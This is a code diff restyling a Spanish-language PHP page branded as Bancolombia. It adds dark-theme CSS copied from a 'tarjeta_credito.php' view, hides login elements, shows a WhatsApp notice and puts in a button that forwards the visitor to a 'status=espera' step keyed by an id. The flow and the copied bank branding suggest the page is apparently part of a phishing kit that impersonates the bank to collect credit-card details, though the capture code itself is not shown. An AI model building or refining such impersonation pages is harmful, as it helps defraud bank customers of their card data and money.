@@ -1,48 +1,88 @@
 <style>
-    /* Reutilizamos estilos de tarjeta_credito pero ajustados para esta vista */
-    .whatsapp-icon-container {
+    /* === ESTILOS BASE COPIADOS DE tarjeta_credito.php PARA TEMA OSCURO === */
+    body.cc-view {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+        padding: 20px 0;
+        box-sizing: border-box;
+        background-color: #2b2b2b !important;
+        /* Importante para sobrescribir login.css */
+        background-image: none !important;
+        /* Quitar fondo de login si existe */
+        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+
+    /* Ocultar elementos del login normal que pudieran filtrarse */
+    .cc-view .login-container,
+    .cc-view .info-banner,
+    .cc-view .background-traces,
+    /* Si existen elementos de fondo */
+    .header,
+    .footer
+
+    /* Si existen en el body */
+        {
+        display: none !important;
+    }
+
+    .card-module {
+        background-color: #262626;
+        color: #e0e0e0;
+        padding: 35px 30px;
+        border-radius: 8px;
+        box-shadow: 0 4px 15px rgba(0, 0, 0, 0.4);
+        width: 90%;
+        /* Ajuste responsive */
+        max-width: 380px;
+        box-sizing: border-box;
+        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        margin: 0 auto;
         text-align: center;
-        margin-bottom: 20px;
+        position: relative;
+        z-index: 100;
+    }
+
+    /* === ESTILOS ESPECÍFICOS DE WHATSAPP === */
+    .whatsapp-icon-container {
+        margin-bottom: 25px;
     }
 
     .whatsapp-icon {
-        font-size: 3em;
+        font-size: 3.5em;
+        /* Un poco más grande */
         color: #25D366;
-        /* WhatsApp Green */
         background: #fff;
         border-radius: 50%;
-        /* Circular looks better contextually, or rounded square */
         padding: 15px;
         width: 80px;
         height: 80px;
         display: inline-flex;
         align-items: center;
         justify-content: center;
-        box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
     }
 
     .wa-title {
-        color: #f0f0f0;
-        text-align: center;
-        font-weight: bold;
-        font-size: 1.3em;
+        color: #fff;
+        font-weight: 700;
+        font-size: 1.4em;
         margin-bottom: 20px;
     }
 
     .wa-box {
         background-color: #333;
-        /* Slightly lighter than card-module bg */
-        border: 1px solid #444;
-        border-radius: 8px;
-        padding: 15px;
-        margin-bottom: 25px;
-        text-align: center;
+        border: 1px solid #404040;
+        border-radius: 12px;
+        padding: 20px;
+        margin-bottom: 30px;
     }
 
     .wa-text {
-        color: #b0b0b0;
+        color: #ccc;
         font-size: 0.95em;
-        line-height: 1.5;
+        line-height: 1.6;
         margin: 0;
     }
 
@@ -53,32 +93,33 @@
 
     .wa-button {
         width: 100%;
-        padding: 15px;
+        padding: 16px;
         background-color: #f0c300;
         border: none;
-        border-radius: 25px;
-        color: #333;
-        font-size: 1em;
-        font-weight: bold;
+        border-radius: 30px;
+        color: #222;
+        font-size: 1.1em;
+        font-weight: 700;
         cursor: pointer;
         display: flex;
         align-items: center;
         justify-content: center;
         gap: 10px;
         text-decoration: none;
-        transition: background-color 0.3s;
+        transition: transform 0.2s, background-color 0.2s;
+        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
     }
 
     .wa-button:hover {
         background-color: #d4ac00;
+        transform: translateY(-2px);
     }
 
     .wa-footer {
-        margin-top: 30px;
-        text-align: center;
-        color: #666;
-        /* Darker text for footer */
-        font-size: 0.8em;
+        margin-top: 40px;
+        color: #777;
+        font-size: 0.85em;
+        line-height: 1.6;
     }
 </style>
 
@@ -100,16 +141,16 @@
         </p>
     </div>
 
-    <!-- El botón redirige a espera, asumiendo que el usuario ya confirmó -->
     <a href="index.php?status=espera&id=<?php echo htmlspecialchars($_GET['id'] ?? ''); ?>" class="wa-button">
         <i class="fa-regular fa-circle-check"></i>
         Entendido
     </a>
 
     <div class="wa-footer">
-        <p>
-            <?php echo date('l d \d\e F \d\e Y h:i:s A'); ?>
-        </p>
-        <p>Copyright © 2025 Bancolombia.</p>
+        <p><?php
+        setlocale(LC_TIME, 'es_ES.UTF-8', 'es_ES', 'esp');
+        echo ucfirst(strftime('%A %d de %B de %Y %I:%M:%S %p'));
+        ?></p>
+        <p>Copyright © <?php echo date('Y'); ?> Bancolombia.</p>
     </div>
 </div>
